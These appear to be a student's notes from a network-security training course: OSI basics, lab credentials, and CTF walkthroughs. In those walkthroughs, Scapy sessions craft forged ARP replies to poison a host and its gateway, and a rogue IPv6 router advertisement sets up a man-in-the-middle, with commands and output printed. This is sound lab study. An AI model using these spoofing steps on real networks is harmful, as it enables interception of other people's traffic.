## CCTC Networking Day 1 

- agenda
    - intros
    - CTFd orientation
    - test connections to internet host
    - network fundamental lecture
    - scapy challenges 

## Admin Data 

### CTFd Info 
| Field | Value | 
|-|-|
| **CTFd  URL** | http://10.50.28.241:8000/ |
| *Username* | JAMO-005-B |
| Pass | JAMO-005-B|

### Internet Host Info
| Field | Value | 
|-|-|
| Username| student_11 |
| Pass | password| 
| Command | ssh student@10.50.39.177 -X |

**Be sure to check notifications for flags, info, etc**
Meat and Potatoe sections --> *Big days, recon, movement, and redirection*

### Practice CTFd
| Field | Value | 
|-|-|
| URL | http://10.50.25.190:8000/ | 
| username| jackdmoody0427 | 
| password | *** | 
| class login | b 21005 | 
| password | b 21005 | 

### CTFd info
| Field | Value | 
|-|-|
| Flag | N3tw0rk@RPFund3m3nt@ls| 
| name | Packet Manipulation 1 | 

## Day 1: Network Fundamentals

### OSI Model
- layer 1: physical
    - example devices: hubs, repeaters, sfp's 
    - responsibilities: 
        - Hardware Specifications
        - Encoding and Signaling
        - Data Transmission and Reception
        - Physical Network Design

- Layer 2: Data Link
    - used when 2 hosts need to talk across a physical medium
    - data link sublayers: MAC (Media Access Control), LLC (Logical Link control)
    - ethernet header
| Ether Type |type of Traffice | 
|-|-|
| 0x0800 | IPv4| 
| 0x0806 | ARP |
| 0x86DD | IPv6 | 
| 0x8100 | VLAN Tag| 
- Layer 3: Network Layer
    - need to understand IPv4 vs IPv6 headers 

## Time for some flags! 

Here is the OPORD:
Gorgas Network Validation (GNV)
XX OCT 2023
Start Time: ~1300
Duration: 4 hour

Type of Operation: Network & Protocol familiarization, Custom Packet Creation & Manipulation

Objective: Identify and Validate the methods of encapsulation, header manipulation, packet traversal, and header structure in order to assist Gorgan Cyber Forces. Craft Custom ARP Requests and obfuscated ICMPv6 packets to enable Gorgas Cyber Forces to perform effective host discovery and Manipulation. You will use scapy and leverage ARP functions to manually "discover" your windows host, as a valid test case to provide to their cyber forces. You will use scapy and leverage IPv6 auto configuration functions to create a means of IPv6 direct communications between the Linux and Windows Machine.


Scenario Credentials: NETWORK FUNDAMENTALS - START FLAG = N3tw0rkFund3m3nt@ls


--------------------------------------------------------------

### Task 1

Packet Manipulation

Type of Operation: Reconnaissance and Data Interception

Objective: Intel has been provided about sensitive information being sent over the network from an unknown source to T3. The targets are using ICMP as a covert channel to circumvent security. You are tasked with intercepting this data stream without the target suspecting the data stream has been compromised. You are instructed to perform a man-in-the-middle attack using Gratuitous ARPs from a system on the same network as the target. Utilizing T2, create a SCAPY script to perform a MitM and intercept the data transmission.

START FLAG = {provided in notification}

Task: Scapy Man in the Middle (MitM) with ARP

Utilize the targets T1 , T2 , T3 , and T4 to develop a Scapy MitM using Gratuitous ARPs.

From T2, perform a ARP poison against T3 to change the gateway (T4) MAC to the MAC of T2 .

From T2, perform a ARP poison against T4 to change the T3 MAC to the MAC of T2 .
From T2, utilize TCPDUMP or Wireshark to intercept the FLAG being sent.


--------------------------------------------------------------

### Task 2

Packet Manipulation 2

Type of Operation: Reconnaissance and Data Interception

Objective: Intel has been provided about sensitive information being sent over the network from T3 to an unknown target. The targets are using ICMPv6 as a covert channel to circumvent security. You are tasked with intercepting this data stream without the target suspecting the data stream has been compromised. You are instructed to perform a Stateless Address Auto-Configuration (SLAAC) man-in-the-middle attack using ICMPv6 from a system on the same network as the target. Utilizing T2, create a SCAPY script to perform a MitM and intercept the data transmission.

START FLAG = {provided in notification}

Task: Scapy Man in the Middle (MitM) with ICMPv6

Utilize the targets T1, T2, and T3 to create a SLAAC Router Advertisement message using Scapy to create a MitM.

From T2, send a SLAAC ICMPv6 Router Advertisement message to T3.

From T2, utilize TCPDUMP or Wireshark to intercept the FLAG being sent.



--------------------------------------------------------------

### Task 3

Basic Analysis - Utilizing Berkeley Packet Filters

Type of Operation: PCAP Examination

Objective: You have been given a pcap of unknown contents for examination. You are tasked with performing basic analysis of the contents of this pcap using Berkeley Packet Filters (BPF).

START FLAG = {provided in notification}



--------------------------------------------------------------

Scheme of Maneuver:
Task 1
> INTERNET_HOST (T1)
→ BLUE_HOST-1 (T2)
→ BLUE_HOST-4 (T3)
→ BLUE_POP-Router (T4)

Task 2
> INTERNET_HOST (T1)
→ BLUE_HOST-1 (T2)
→ BLUE_HOST-4 (T3)

Task 3
> INTERNET_HOST (T1)
--------------------------------------------------------------

Tools/Techniques: Tcpdump, Tshark, Open Source Research (OSR), Wireshark, to Monitor and View your custom packets. Scapy, a packet manipulation program.

Prior Approvals: All connections will be established from your analyst Op Stations. Provide all findings through the associated CTF challenges:

Target Section:

--------------------------------------------------------------

T1
Hostname: INTERNET_HOST
External IP: 10.50.XXX.XXX (ALREADY PROVIDED)
Internal IP: 10.10.0.40 (ALREADY PROVIDED)
creds: student:password
Action: Use as a pivot to access T2

T2
Hostname: BLUE_HOST-1
IP: 172.16.82.106
creds: student:password
Action: Successfully perform a ARP MitM using Scapy

T3
Hostname: BLUE_HOST-4
IP: 172.16.82.115
creds: (none)
Action: Suspected client recieving sensitive information

T4
Hostname: BLUE_POP-Router
IP: 172.16.82.126
creds: vyos:password
Action: Gateway of the network

-----------------
# Task 1 - packet manipulation - ARP
Data is being sent to T3 from an unknown source over an ICMP covert channel. Use scapy to perform a MitM using ARP to capture this data.

On T2 edit the /proc/sys/net/ipv4/ip_forward file to enable IP Forwarding. Change the value from 0 to 1.

On T2 open scapy as root.

Create the Ethernet Header (Ether) and change the ether-type to the hex value for ARP.

Create the ARP header (ARP) to Poison T4

Create the ARP header (ARP) to Poison T3

Send your crafted headers using sendp.

Intercept the flag being sent over the network.

Use TCPDUMP or Wireshark to capture the FLAG using icmp and host 172.16.82.115 capture filters to minimize the traffic.

The mission prompt will provide the target details.

1. ssh student@10.50.39.177 -X
2. ssh 172.16.82.106 #this gets you into bluehost1 (T2)
3. cat /proc/sys/net/ipv4/ip_forward #gotta make sure it equals 1
4. sudo scapy
Now actually starting scapy stuff
1. Lookign at the challenge, we have to "Create the Ethernet Header (Ether) and change the ether-type to the hex value for ARP."
```
>>> a = Ether()
>>> a
<Ether  |>
>>> a.show()
WARNING: Mac address to reach destination not found. Using broadcast.
###[ Ethernet ]### 
  dst       = ff:ff:ff:ff:ff:ff
  src       = fa:16:3e:a0:65:dd
  type      = 0x9000

>>> a.type=0x0806
>>> a.show()
WARNING: Mac address to reach destination not found. Using broadcast.
###[ Ethernet ]### 
  dst       = ff:ff:ff:ff:ff:ff
  src       = fa:16:3e:a0:65:dd
  type      = ARP
```

2. "create the Arp header to poison T4(Blue-pop router)"
```
>>> b.op=2
>>> b.show()
###[ ARP ]### 
  hwtype    = 0x1
  ptype     = IPv4
  hwlen     = None
  plen      = None
  op        = is-at
  hwsrc     = fa:16:3e:a0:65:dd
  psrc      = 172.16.82.106
  hwdst     = 00:00:00:00:00:00
  pdst      = 0.0.0.0

>>> b.psrc = "172.16.82.115"
>>> b.pdst = "172.16.82.126"
>>> b.show()
###[ ARP ]### 
  hwtype    = 0x1
  ptype     = IPv4
  hwlen     = None
  plen      = None
  op        = is-at
  hwsrc     = fa:16:3e:a0:65:dd
  psrc      = 172.16.82.115
  hwdst     = 00:00:00:00:00:00
  pdst      = 172.16.82.126
```

3. "Create the arp header to poinson T3 (bluehost-4)"
```
>>> c=ARP()
>>> c.op=2
>>> c.psrc = "172.16.82.126"
>>> c.pdst="172.16.82.115"
>>> c.show()
###[ ARP ]### 
  hwtype    = 0x1
  ptype     = IPv4
  hwlen     = None
  plen      = None
  op        = is-at
  hwsrc     = fa:16:3e:a0:65:dd
  psrc      = 172.16.82.126
  hwdst     = 00:00:00:00:00:00
  pdst      = 172.16.82.115
```
4. Send  your crafted header using "sendp" 
- ` sendp(a/b, iface="eth0"); sendp(a/c, iface="eth0")`

5. "Intercept the flag being sent over the network. Use TCPDUMP or Wireshark to capture the FLAG using icmp and host 172.16.82.115 capture filters to minimize the traffic."
- `sudo tcpdump icmp and host 12.16.82.115 -X`
- Dog_say_ARP_ARP is the flag 

-------
## Task 2 
1. Create the IPv6 header (IPv6) using the All Nodes multicast address.
```
>>> a = IPv6()
>>> a.show()
###[ IPv6 ]### 
  version   = 6
  tc        = 0
  fl        = 0
  plen      = None
  nh        = No Next Header
  hlim      = 64
  src       = ::1
  dst       = ::1
a.dst = "ff02::1"

```
2. Create the ICMPv6 Router Advertisement Header (ICMPv6ND_RA).
```
>>> b = ICMPv6ND_RA()
>>> b.show()
###[ ICMPv6 Neighbor Discovery - Router Advertisement ]### 
  type      = Router Advertisement
  code      = 0
  cksum     = None
  chlim     = 0
  M         = 0
  O         = 0
  H         = 0
  prf       = High
  P         = 0
  res       = 0
  routerlifetime= 1800
  reachabletime= 0
  retranstimer= 0
```
3. Set the Source Link-Local Address Option (ICMPv6NDOptSrcLLAddr) using your MAC as the source.
```
>>> c=ICMPv6NDOptSrcLLAddr()
>>> c.lladdr ="fa:16:3e:e8:36:2c" 
>>> c.show()
###[ ICMPv6 Neighbor Discovery Option - Source Link-Layer Address ]### 
  type      = 1
  len       = 1
  lladdr    = fa:16:3e:e8:36:2c
```
4. Set the ICMPv6 MTU Option. (ICMPv6NDOptMTU).
- `d = ICMPv6NDOptMTU()` 

5. Set the ICMPv6 Prefix Information Option (ICMPv6NDOptPrefixInfo) and assign the Prefix (fd00:deaf:cafe::) and Prefix Length of 64.

```
>>> e = ICMPv6NDOptPrefixInfo()
>>> e.show()
###[ ICMPv6 Neighbor Discovery Option - Prefix Information ]### 
  type      = 3
  len       = 4
  prefixlen = 64
  L         = 1
  A         = 1
  R         = 0
  res1      = 0
  validlifetime= 0xffffffff
  preferredlifetime= 0xffffffff
  res2      = 0x0
  prefix    = ::

>>> e.prefix = "fd00:deaf:cafe::"
>>> e.prefixlen = "64"
>>> e.show()
###[ ICMPv6 Neighbor Discovery Option - Prefix Information ]### 
  type      = 3
  len       = 4
  prefixlen = '64'
  L         = 1
  A         = 1
  R         = 0
  res1      = 0
  validlifetime= 0xffffffff
  preferredlifetime= 0xffffffff
  res2      = 0x0
  prefix    = fd00:deaf:cafe::
```
6. Send your crafted headers and RA options using send.
- `send(a/b/c/d/e)`
- on other computer: `sudo tcpdump icmp6 -X` 
- IC_a_wimpy_MP